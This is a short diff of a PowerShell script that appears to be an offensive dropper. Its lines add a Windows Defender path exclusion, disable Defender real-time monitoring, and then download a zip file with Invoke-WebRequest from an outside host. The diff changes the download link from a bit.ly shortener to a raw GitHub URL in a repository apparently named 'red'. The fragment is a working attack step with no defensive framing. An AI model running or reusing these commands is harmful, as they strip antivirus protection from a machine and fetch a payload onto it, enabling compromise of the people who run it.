@@ -8,7 +8,7 @@ Write-Output "[+] Excluded Path from Windows Defender"
 Set-MpPreference -DisableRealTimeMonitoring $true
 Write-Output "[+] Disabled Windows Defender"
 
-$url = "https://bit.ly/3cjpdSp"
+$url = "https://github.com/alekzandr/red/blob/master/good_files.zip?raw=true"
 $output = "~\good_files_promise.zip"
 Invoke-WebRequest -Uri $url -OutFile $output
 
